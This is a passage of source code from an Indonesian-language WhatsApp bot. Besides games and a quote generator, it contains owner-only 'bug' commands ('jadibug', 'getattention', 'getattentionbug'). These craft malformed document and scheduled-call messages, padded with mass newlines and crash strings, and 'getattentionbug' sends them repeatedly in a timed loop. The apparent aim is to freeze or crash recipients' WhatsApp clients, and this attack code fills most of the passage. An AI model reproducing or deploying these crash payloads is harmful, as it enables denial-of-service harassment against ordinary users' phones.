 delete kuismath[m.sender.split('@')[0]]
 }
}
break
//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await zetsubo.sendText(room.x, str, m, { mentions: parseMention(str) } )
await zetsubo.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await zetsubo.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) zetsubo.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================
case 'jadibug': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!text) throw `Contoh : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
var teks = `${text}`
{
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${teks} ☆⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ${teks} ${buttonkal}`,
}
}), { userJid: from })
zetsubo.relayMessage(from, document.message, { messageId: document.key.id })

}
}
break
case  'testxt':{
zetsubo.sendMessage(from, {text:`${weg}`},{quoted:kalgans})
}
break

case  'qc':{
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await zetsubo.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await zetsubo.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
zetsubo.sendMessage(from,{image: buffer},{quoted : hw})
})
}
break
//=================================================//
case 'getattention': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO" ,
"scheduledTimestampMs": 0,
"title": `${ios1}`
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(from, schedule.message, { messageId: schedule.key.id })
}
break
case 'getattention2': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 1,
"title": `${ios1}`,
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(from, schedule.message, { messageId: schedule.key.id })
}
break

case 'getattention3': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "null",
"scheduledTimestampMs": 0,
"title": `[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${bugui}${ios1}`,
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(from, schedule.message, { messageId: schedule.key.id })
}
break
case 'getattentionbug': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
konsol = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(from, schedule.message, { messageId: schedule.key.id })
	}
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入⁌ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ⁍私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐋𝐎𝐑𝐃 ෴ 𝐒⸙𝐀࿈𝐌私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
